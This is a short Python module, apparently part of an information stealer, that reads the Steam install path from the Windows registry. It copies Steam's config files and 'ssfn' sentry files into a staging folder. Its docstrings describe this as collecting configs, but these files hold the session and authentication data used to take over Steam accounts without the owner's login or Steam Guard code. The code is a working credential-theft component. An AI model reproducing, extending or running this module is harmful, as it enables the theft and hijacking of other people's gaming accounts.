from re import findall
from shutil import copy
from os import listdir, makedirs, path
from winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW64_32KEY


class Steam:
    """
    Collects configs from the Steam.
    """
    def __init__(self, storage_path: str, folder: str):

        self.__storage_path = storage_path
        self.__folder = folder

    def __create_folder(self) -> None:
        """
        Creates storage for the Steam module.
        :return: None
        """
        storage_path = rf"{self.__storage_path}\{self.__folder}"

        if not path.exists(storage_path):
            makedirs(storage_path)

    @staticmethod
    def __get_steam_path() -> str:
        """
        Gets the Steam installation path from the registry.
        :return: str
        """
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Valve\Steam")
        except FileNotFoundError:
            key = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Valve\Steam", 0, KEY_READ | KEY_WOW64_32KEY)

        value, _ = QueryValueEx(key, "InstallPath")

        return value

    def __get_steam_files(self) -> None:
        """
        Collects configs from the Steam.
        :return: None
        """
        steam_path = self.__get_steam_path()

        if not path.exists(steam_path):
            print(f"[Steam]: No steam found")
            return

        storage_path = rf"{self.__storage_path}\{self.__folder}"

        configs = [file for file in listdir(rf"{steam_path}\config") if file != "avatarcache"]

        for config in configs:
            copy(rf"{steam_path}\config\{config}", storage_path)

        ssfns = sum([findall(r"ssfn.*", file) for file in listdir(steam_path)], [])

        for ssfn in ssfns:
            copy(rf"{steam_path}\{ssfn}", storage_path)

    def run(self) -> None:
        """
        Launches the Steam collection module.
        :return: None
        """
        try:

            self.__create_folder()
            self.__get_steam_files()

        except Exception as e:
            print(f"[Steam]: {repr(e)}")
